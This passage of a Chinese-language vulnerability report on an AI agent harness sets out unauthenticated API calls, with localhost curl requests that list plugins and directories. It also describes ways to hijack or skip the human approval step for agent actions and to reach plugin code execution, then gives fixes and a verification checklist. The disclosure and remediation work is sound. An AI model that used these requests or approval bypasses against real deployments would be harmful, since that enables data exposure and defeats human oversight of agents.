# T1 web（默认 profile，无任何 patch）
cd /Users/lihao/Documents/deepseek-harness
node --import tsx/esm apps/cli/src/bin.ts web --port 3080

# 三个无鉴权调用（注意：请求里没有任何 token/Origin）
curl -s -X POST http://127.0.0.1:3080/api/pluginInventory/list -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r1","method":"pluginInventory/list","payload":{"args":{}}}'
curl -s -X POST http://127.0.0.1:3080/api/dynamicCordisRunner/inventory -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r2","method":"dynamicCordisRunner/inventory","payload":{"args":{}}}'
```

`host.listDirectory` 需要 browse 能力（headless 部署下默认是 native picker，不可用）——
用脚本里的 browse overlay（`- id: directory-picker disabled` + insert `directory-picker-browse`）
重启 web 后再调：

```sh
curl -s -X POST http://127.0.0.1:3080/api/host.listDirectory -H 'content-type: application/json' \
  -d '{"type":"client-request","rpcId":"r3","method":"host.listDirectory","payload":{"path":"/Users/lihao"}}}'
```

### 6.6 亲手确认的关键点
- 请求头只有 `content-type`——证明“trusted-host”不等于“认证”；
- LAN 扩展：`webserver.host` 接受 `0.0.0.0`，`resolveLanTrust`
  （`packages/bundle/web-app/src/index.ts:73-91`）自动把本机 LAN IPv4 加入 `trustedHosts`，
  于是 LAN 对端也放行（可用局域网内另一台机器复测）。

---


### 6.7 如何修复（含修复验证）

**根因**：Typert Gateway 以 `authority: 'trusted-host'` 拦截 `/api`
（`packages/api/gateway/src/index.ts:110-118`），而 `isTrustedApiRequest` 只检查
`Host` ∈ loopback/`trustedHosts`，**不检查 Origin、不校验任何身份**
（`packages/client/connection/src/api-request-trust.ts:96-118`）；默认 profile 就挂载
`plugin-inventory` / `cordis-host-runner` / `api-remotes`；`resolveLanTrust`
（`packages/bundle/web-app/src/index.ts:73-91`）在 `0.0.0.0` 绑定下自动把所有 LAN IPv4 加入
`trustedHosts`。

**修复**
- 为 `/api` Remote 面加**真实认证**：人类 UI 会话 token（或等价的会话绑定凭据），并校验
  `Origin` 与 `Referer`；`trusted-host` 只应决定“可达性”，不能当作身份。
- 未认证的端点默认**全部关闭**；确实需要开放的只读端点（若有）进白名单并文档化。
- `host.listDirectory` 限定只能列**已注册工作区**，禁止任意路径。
- 移除“自动把所有 LAN IP 加入 `trustedHosts`”的行为（`resolveLanTrust`），LAN 暴露改为显式、
  带警告的配置项。

**修复后验证**
- 重跑 `poc-v3b-typert-unauthenticated-surface.sh`：预期三个 RPC 全部 401/403，
  `01/02/04-*.json` 里没有有效数据。
- 局域网对端复测（`0.0.0.0` 部署）同样被拒。


### 6.8 详细解释与根因分析

**脚本逐段在做什么**（对应 `poc-v3b-typert-unauthenticated-surface.sh`）
1. 用**默认 profile** 启动 `dsh web`（无任何 patch）——证明攻击面是默认存在的。
2. `pluginInventory/list`：返回 Loader 插件清单（模块名/状态），测试实例 133 项。
3. `dynamicCordisRunner/inventory`：返回动态插件注册表（含 `pluginId` / `activeRun.pluginRunId`）。
4. `host.listDirectory("/")`：headless 默认解析为 native picker（不可用）——记录默认形态。
5. 用 browse overlay（`directory-picker` → `directory-picker-browse`）模拟 headless 部署后，
   `host.listDirectory("/Users/lihao")` 无鉴权返回 48 项目录列表。

**根因分析（为什么存在）**
- Typert Gateway 以 `authority: 'trusted-host'` 拦截 `/api`（`packages/api/gateway/src/index.ts:110-118`）；
  `isTrustedApiRequest`（`packages/client/connection/src/api-request-trust.ts:96-118`）只要求
  `Host` ∈ loopback/`trustedHosts`，**不要求 Origin，不校验任何身份**。
- 默认 profile 就挂载 `plugin-inventory`、`cordis-host-runner`、`api-remotes`（
  `packages/bundle/web-app/cordis.patch.yml`）与 `@deepseek-ai/dsh-api-gateway`（base patch）。
- LAN 扩展：`webserver.host` 接受 `0.0.0.0`，`resolveLanTrust`
  （`packages/bundle/web-app/src/index.ts:73-91`）自动把本机 LAN IPv4 加入 `trustedHosts`——
  于是 LAN 对端无需 Origin 即通过 Host 围栏。
- 本质：`trusted-host` 表达的是“从哪来可达”，被当成了“是谁/能否调用”的身份——是认证缺失，
  不是配置漏项。

**前提与攻击面**：本机任何进程（默认部署）；LAN 对端（需 `0.0.0.0` 配置）；无任何凭据。

**影响**：信息泄露（插件清单、动态插件注册表、任意目录列表）；与 V3 组合后，`invoke` 就是
“执行任意运行中插件 host handler”的原语，`runHostHalf` 就是“无审批激活插件”的原语——
V3b 是这些原语的**无鉴权入口**。

**与已公开报告的关系（增量性）**：P16/G-2 覆盖无鉴权 RPC 直读会话/宿主数据；本项是默认挂载的
**Remote 服务面**本身未认证，且携带执行原语。G-4 原为文档级；本项提供可复现的默认面。

**诚实局限**：`listDirectory` 需要 browse 能力（headless 形态）；LAN 面依赖显式 `0.0.0.0`
配置；部分端点在组合不同时不可达（脚本已把不可用形态记录下来，便于区分“拒绝”与“未挂载”）。

## 7. 常见失败排查

| 症状 | 原因 | 处理 |
|---|---|---|
| `REPO=... is not a deepseek-harness checkout` | 没找到仓库 | `REPO=/Users/lihao/Documents/deepseek-harness bash ../dsh-security-pocs/poc-*.sh` |
| mock 一直 `ready` 不出现 | 8000 被占 / tsx 未装 | `lsof -nP -iTCP:8000`；确认 `pnpm install` 完成 |
| web 起不来 | 3080 被占 / overlay 语法错 | `lsof -nP -iTCP:3080`；看 `/tmp/dsh-*.log` |
| V1 60s 无 approval 帧 | mock sequence 与工具名不匹配 | 看 `/tmp/mock-bash.log`、`/tmp/dsh-mock-bash.log` |
| V2 无跨会话命中 | 索引未建好 / sleep 不够 | 看 `/tmp/dsh-web-07-*.log`；把 `sleep 8` 调大 |
| V3 `runHostHalf rejected` | agentId 抄错 / 插件不在 inventory | 对比 `02-inventory-before.json` 字段 |
| `rg: command not found` | 缺 ripgrep | `brew install ripgrep`（README 有说明） |

> 注意：脚本启动时会杀掉 3080/8000 上的现有监听进程（`lsof | xargs kill`），不要在有
> 其他服务占用这两个端口时运行。

---

## 8. 核验检查清单（给怀疑者）

- [ ] 四个脚本都**不需要 API key**：检查是否有任何请求离开本机（`lsof -i` / 抓包），
      `DEEPSEEK_API_KEY=mock-key` 只指向 `127.0.0.1:8000`。
- [ ] V1：攻击者 respond 前后**没有**经过任何 UI/人工；探针文件真实存在且在工作区外。
- [ ] V2：创建攻击者会话时**从未出现**受害者 sessionId；泄露的是受害者 prompt 原文。
- [ ] V3：`inventory-before` 无 `activeRun`（定义后未运行）→ `requestId:null` 激活 →
      `invoke` 返回 `pwned:true`。
- [ ] V3b：裸 curl（无 Authorization/Origin）拿到插件清单与目录列表。
- [ ] 每个脚本退出码为 0 且打印 `VERIFIED`/`CONFIRMED`/`PWNED`/`ok:`。


---

## 9. 修复优先级与验证矩阵

| 漏洞 | 严重度（本地攻击面） | 修复优先级 | 关键修复点 | 修复后 PoC 应在哪一步失败 |
|---|---|---|---|---|
| V1 跨会话审批/提问劫持 | High（≈7.8–8.8） | P0 | respond 绑定会话所有权 + 一次性 token；mux 按会话隔离 | `attacker /api/respond` 返回 `accepted:false`/403；探针文件不出现 |
| V3 `runHostHalf` 绕过 + host 代码执行 | High（opt-in 时 ≈7.5–8.8） | P0 | `requestId:null` 必须有人类 UI token；Remote 方法绑定真实会话持有者；`invoke` 校验 `plugin.sessionId` | `runHostHalf` 被拒 / `invoke` 无权限 |
| V3b 未认证 /api Remote 面 | 默认面 ≈5.3–6.5；LAN RCE 链高 | P1 | /api 加真实认证 + Origin 校验；未认证端点默认关闭；`listDirectory` 限注册工作区；去掉自动加 LAN IP | 三个 RPC 全部 401/403 |
| V2 伪造 cwd 跨会话读 | Medium（opt-in，≈4.3–5.9） | P1 | 授权键改为工作区注册表/会话所有权；`session.create` 校验注册工作区；跨会话读需审批 | A 的 `session_search` 返回 unauthorized / 空；无 `VICTIM_SECRET_` 泄漏 |

**修复验证总原则**：每个修复都以“重跑对应 PoC 失败在预期的那个环节”为准，同时用一次正常
人工流程回归（人类 UI 审批/提问/运行插件仍然可用），避免修复变成“全盘禁用”。

**代码审查清单（修复合并前逐项打勾）**
- [ ] `api-proxy.ts`：`respond` 校验应答者=持有会话（token 绑定），`events.mux` 不再向非持有者广播 `approvalId/rpcId`。
- [ ] `workspace-access.ts`：`headerAuthorized` 不再以 `header.cwd` 字符串做跨会话授权。
- [ ] `api-proxy.ts`：`session.create` 的 `cwd` 只接受已注册工作区，移除任意 `mkdir -p`。
- [ ] `cordis-host-runner/src/index.ts`：`requestId:null` 分支要求人类 UI token；`invoke` 校验 `plugin.sessionId === 调用者会话.id`。
- [ ] `api/remotes/src/agent-lookup.ts`：`agent` 按服务端调用者身份解析，不信任请求体 `sessionId`。
- [ ] `api-request-trust.ts` / `gateway`：`/api` Remote 面要求身份凭证 + Origin 校验；未认证端点默认关闭。
- [ ] `web-app/src/index.ts`：`resolveLanTrust` 不再自动加入全部 LAN IPv4。
